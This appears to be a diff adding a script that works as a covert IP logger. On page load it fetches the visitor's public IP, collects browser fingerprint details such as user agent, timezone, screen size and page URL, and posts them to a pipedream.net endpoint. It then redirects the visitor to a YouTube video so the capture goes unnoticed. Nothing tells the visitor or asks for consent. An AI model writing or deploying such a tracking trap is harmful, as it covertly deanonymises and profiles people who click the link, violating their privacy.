@@ -1,0 +1,26 @@
+<script>
+(async () => {
+  try {
+    const d = await (await fetch('https://api.ipify.org?format=json')).json();
+    const info = {
+      ip: d.ip,
+      user_agent: navigator.userAgent,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: screen.width + 'x' + screen.height,
+      viewport: window.innerWidth + 'x' + window.innerHeight,
+      touch: 'ontouchstart' in window,
+      page: location.href
+    };
+    await fetch('https://eo48x74rfycze88.m.pipedream.net', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(info)
+    });
+  } catch (e) {
+    console.warn('IP send failed, redirecting anyway:', e);
+  }
+  // Replace with your video URL, e.g. https://www.youtube.com/watch?v=abcd1234
+  window.location.replace('https://www.youtube.com/watch?v=SCuLdTDCIEU&list=RDSCuLdTDCIEU&start_radio=1');
+})();
+</script>
